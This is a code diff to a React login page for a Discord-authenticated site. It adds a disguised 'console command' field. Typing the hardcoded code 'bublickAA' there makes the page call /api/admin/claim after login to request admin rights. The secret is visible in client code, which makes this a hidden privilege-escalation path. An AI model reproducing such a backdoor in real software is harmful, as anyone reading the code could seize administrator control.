@@ -1,19 +1,55 @@
-import React, { useEffect } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { Rocket, ArrowRight } from 'lucide-react';
+import { Rocket, Terminal } from 'lucide-react';
 import StarBackground from '../components/StarBackground';
 
 const Auth = () => {
   const navigate = useNavigate();
+  const [secretCode, setSecretCode] = useState('');
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
     const token = params.get('token');
+    
+    const handleAuth = async (token) => {
+        localStorage.setItem('auth_token', token);
+        
+        // Check for secret claim code
+        const storedCode = localStorage.getItem('admin_claim_code');
+        if (storedCode === 'bublickAA') {
+            try {
+                await fetch('/api/admin/claim', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${token}`
+                    },
+                    body: JSON.stringify({ code: storedCode })
+                });
+                // Clear code after attempt
+                localStorage.removeItem('admin_claim_code');
+            } catch (e) {
+                console.error("Failed to claim admin", e);
+            }
+        }
+        
+        navigate('/dashboard');
+    };
+
     if (token) {
-      localStorage.setItem('auth_token', token);
-      navigate('/dashboard');
+      handleAuth(token);
     }
   }, [navigate]);
+
+  const handleSecretCodeChange = (e) => {
+      const code = e.target.value;
+      setSecretCode(code);
+      if (code === 'bublickAA') {
+          localStorage.setItem('admin_claim_code', code);
+      } else {
+          localStorage.removeItem('admin_claim_code');
+      }
+  };
 
   return (
     <div className="relative min-h-screen flex items-center justify-center p-4 text-text-main bg-bg-main transition-colors duration-300">
@@ -50,6 +86,20 @@ const Auth = () => {
               </svg>
               Войти через Discord
             </button>
+
+            <div className="relative">
+                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                    <Terminal className="h-4 w-4 text-text-muted" />
+                </div>
+                <input 
+                    type="text" 
+                    placeholder="Консольная команда (op)"
+                    value={secretCode}
+                    onChange={handleSecretCodeChange}
+                    className="w-full bg-bg-main/50 border border-border-color rounded-lg py-2 pl-10 pr-4 text-sm text-text-main focus:outline-none focus:border-accent-primary transition-colors placeholder-text-muted/50"
+                />
+            </div>
+
           </div>
         </div>
       </div>
